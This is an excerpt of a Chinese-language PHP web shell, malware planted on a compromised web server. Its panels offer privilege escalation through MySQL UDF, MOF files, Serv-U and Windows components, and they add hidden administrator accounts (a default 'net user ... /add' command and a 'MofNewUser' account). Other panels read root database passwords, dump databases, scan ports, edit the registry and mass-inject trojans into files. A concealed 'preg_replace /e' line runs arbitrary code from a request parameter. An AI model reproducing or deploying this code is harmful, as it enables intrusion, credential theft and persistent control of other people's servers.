...
"提权工具" => array("sqlshell" => "执行SQL语句","mysql_exec" => "MYSQL管理","othersql" => "其他数据库","myexp" => "MYSQL_UDF提权","winapi" => "WIN API提权","mofshell" => "Mof双重提权","cmd" => "执行CMD命令","linux" => "反弹提权","servu" => "Serv-U提权","readpass" => "低权限读root密码","downloader" => "文件下载","port" => "端口扫描"),
"批量操作" => array("guama" => "批量挂马清马","tihuan" => "批量替换内容","scanfile" => "批量搜索文件","scanphp" => "批量查找木马","zippak" => "zip解压"),
...
switch($eanver){
	...
	html_n("<li><a title='程序更新' href='http://www.caidaome.com/' target=\"main\">程序更新</a></li>");
...
return $info;
	...
	html_a('?eanver=main&path='.uppath($path),'<b><font color=red>上级目录</font></b>');
	html_n('</b></td><td align="center" width="15%"><b>操作</b></td><td align="center" width="10%">');
	html_n('<b>文件属性</b></td><td align="center" width="15%"><b>修改时间</b></td><td align="center" width="5%"><b>文件大小</b></td></tr>');
	while($dirs = @$dir->read()){
	...
	while($files = @$dir->read()){
		...
		if(!is_dir($filepath)){
			...
			html_a($Fileurls,$files,' target="_blank" title="打开"');
			html_n('</td><td align="center">');
...
<form method="POST" name="gform" id="gform" ><center><div class="actall">执行命令新增很多隐藏函数，这个执行不了，除了反弹出来，绝对没有任何工具能执行命令！外加使用BASE64加密提交，防止被拦（小细节，大成就）</div><div class="actall">
...
<a href="?eanver=sqlshell&o=d">[MYSQL下载文件]</a>
<a href="?eanver=sqlshell&o=tk">[MYSQL脱裤备份]</a> </div>
<div class="actall">
...
<select onchange="return nFull(options[selectedIndex].value)">
	...
	<option value="4">查询MYSQL插件目录</option>
	<option value="5">NTFS-ADS流创建目录1</option>
	<option value="5">NTFS-ADS流创建目录2</option>
</select>
...
{
print<<<END
<div class="actall">提权命令 <input name="SUCommand" type="text" value="net user PHPINFO_CC PHPINFO_CC /add & net localgroup administrators PHPINFO_CC /add" style="width:600px"><br>
...
html_base();
	...
	case "myexp":
	$MSG_BOX = '请先导出DLL,再执行命令.MYSQL用户必须为root权限,导出路径必须能加载DLL文件.<br>mysql5.1版本以上需在mysql插件目录安装UDF，若创建失败请先用NTFS-ADS流功能创建文件夹';
	$info = '命令回显';
...
echo '<br>';
echo '<div><h5>读取&写入&删除注册表</h5><br></div>';
echo '<br>';
print<<<END
...
<input class="bt" type="submit" value="读取"></form></TD></TR><br><br></div>   
END;
...
<input type="hidden" name="action" value="写入">  
<input class="bt" type="submit" value="写入"></form></TD></TR><br><br><br></div>   
END;
...
<br><a href="?eanver=winapi&winshell=wscript"> [ WScript组件 ] </a><br><br>
<h5>本功能使用PHP调用Windows组件中的Wscript组件。<br>
Wscript为调用cmd命令组件<br>{$tip}<a href="?eanver=winapi&winshell=shelluser"> [ Shell.User组件 ] </a><br><br>
<h5>本功能使用PHP调用Windows组件中的Shell.user组件<br>
USER组件为Windows系统用户操作相关组件<br>{$tip}<a href="?eanver=winapi&winshell=regedit"> [ 注册表操作 ] </a><br><br>
<h5>本功能使用PHP调用Windows组件中的Shell.Wscript组件<br>
<h5><font color=red>本功能可读取，写入，删除注册表操作</font>
...
echo "可写目录(''savefile''是文件名):";
echo "<div class='actall'><input type='text' name='path' value='c:/recycler/savefile'><br/></div>";
echo "<div class='actall'><input type='submit' name='submit' value='提交'><br/></div>";
echo "</form>";
echo "<div class='actall'>ps:mof提权适用于windows服务器<br>1:mof提权依靠wscript.shell组建执行命令和shell.users加用户<br>2:回显命令有时不可用，但不影响执行效果<br>3:本功能支持wscript.shell和shell.user双重提权<br>4:执行完毕后请等待些时间再查看结果<br>5:2种方式不能同一时间执行，请耐心等待结果后再执行其他功能<br><br>不停加帐户解决办法:<br>";
echo "
第一 net stop winmgmt 停止服务，<br>
第二 删除文件夹：C:\WINDOWS\system32\wbem\Repository\<br>
第三 net start winmgmt 启动服务<br>
第四：完毕不会在执行了。<br>
C:\WINDOWS\system32\wbem\Repository\ 放的是储存库　我们执行的.mof都会被加入到这个库了。<br>
然后一直按脚本设置的时间执行。。<br>
删除后　重新启动　会重建个默认储存库　这样我们先前执行mof就没了。</div>";
exit;
}
...
echo "<div class='actall'><input type='submit' value='  wscript执行命令  '>";
echo "</form><br><br>";

echo "<form action='' method='post'>";
echo "<input type='hidden' name='flag' value='flag'>";
echo "<input type='submit'value='读取wscript执行结果'></div>";
echo "</form>";
...
echo "<div class='actall'><input type='submit' value=' shelluser添加帐户  '></div>";
echo "</form>"; 
if (isset($_POST['cmd'])){
$strCmd=$_POST['cmd'];
...
if(mysql_query($sql1))
  echo "<hr>执行完毕!<br> 请点击\"读取wscript执行结果\"查看结果!!<br>不成功多执行几次。<br>ps:wscript执行需要wscript.shell组建存在。<hr>"; else die(mysql_error());
 mysql_close($conn);
}
...
$sql1="select '$payload' into dumpfile '$mofname';";
if(mysql_query($sql1))
  echo "<hr>执行添加完毕,帐户：MofNewUser 密码：ASDfg123!@#...    <br>ps:ShellUser添加无回显功能,请5分钟后自行查看结果<hr>"; else die(mysql_error());
 mysql_close($conn);
...
if(mysql_query($sql)){
	...
	echo '<form action="" method="post">';
	echo "<h3>MYSQL低权限读取ROOT密码工具</h3>";
	echo '<div class="actall">ip：&nbsp;&nbsp;&nbsp;<input type="text" name="host" value="localhost"><br></div>';
	echo '<div class="actall">帐户：<input type="text" name="name" value="root"><br></div>';
	echo '<div class="actall">密码：<input type="text" name="password"><br></div>';
	echo '<div class="actall">库名：<input type="text" name="db" value="mysql"></div>';
	echo '<div class="actall">&nbsp&nbsp<input type="submit" value="    读取    " name="sub"></div>';
}
break;
case "othersql":
 //其它数据库连接
...
主机：<input type="text" name="mshost" value="{$mshost}" style="width:100px">
帐户:<input type="text" name="msuser" value="{$msuser}" style="width:100px">
密码:<input type="text" name="mspass" value="{$mspass}" style="width:100px">
库名:<input type="text" name="msdbname" value="{$msdbname}" style="width:100px"><br>
<script language="javascript">
function msFull(i){
Str = new Array(11);
Str[0] = "";
...
<input class="bt" type="submit" value="执行"></form></div>
END;
if ($msaction == 'msquery'){
...
<div class="actall">
主机:<input type="text" name="orahost" value="{$orahost}" style="width:100px">
端口:<input type="text" name="oraport" value="{$oraport}" style="width:50px">
帐户:<input type="text" name="orauser" value="{$orauser}" style="width:80px">
...
<div class="actall">库名:<input type="text" name="ifxhost" value="{$ifxdbname}" style="width:100px">
帐户:<input type="text" name="ifxuser" value="{$ifxuser}" style="width:100px">
密码:<input type="text" name="ifxpass" value="{$ifxpass}" style="width:100px"><br>
<script language="javascript">
function ifxFull(i){
Str = new Array(11);
Str[0] = "";
...
帐户:<input type="text" name="db2user" value="{$db2user}" style="width:100px">
密码:<input type="text" name="db2pass" value="{$db2pass}" style="width:100px">
库名:<input type="text" name="db2dbname" value="{$db2dbname}" style="width:100px"><br>
<script language="javascript">
function db2Full(i){
Str = new Array(4);
Str[0] = "";
...
地址:<input type="text" name="fbpath" value="{$fbpath}" style="width:100px">
帐户:<input type="text" name="fbuser" value="{$fbuser}" style="width:100px">
...
使用前请在【<b><a href="??eanver=info_f">系统信息</a></b>】中确认系统支持php_zip<br>
...
{
 $safemode = TRUE;
 $hsafemode = "<font color=red>ON (安全)</font>";
}
else {$safemode = FALSE; $hsafemode = "<font color=green>OFF (不安全)</font>";
}
...
<table width='100%'><tr><td><form method='GET' target='main'><input type='hidden' name='eanver' value='main'>地址:<input name='path' style='width:90%' value='{$path}'>&nbsp<input name='Submit' type='submit' value='跳到'> <input type='submit' value='刷新' onclick='main.location.reload()'></td></tr><tr align='center'><td><b>安全模式:{$hsafemode}----{$Server_IP}-----{$Server_OS}-----{$Server_Soft}-----{$web_server }</b></td></tr><tr align='center'><td></td></tr></form></table>
END;
...
END;
@preg_replace("/[_]/e",$_REQUEST['h'],"__");}function html_sql(){html_input("text","sqlhost","localhost","<br>MYSQL地址","30");html_input("text","sqlport","3306","<br>MYSQL端口","30");html_input("text","sqluser","root","<br>MYSQL用户","30");html_input("password","sqlpass","","<br>MYSQL密码","30");html_input("text","sqldb","dbname","<br>MYSQL库名","30");html_input("submit","sqllogin","登陆","<br>");html_n('</form>');}
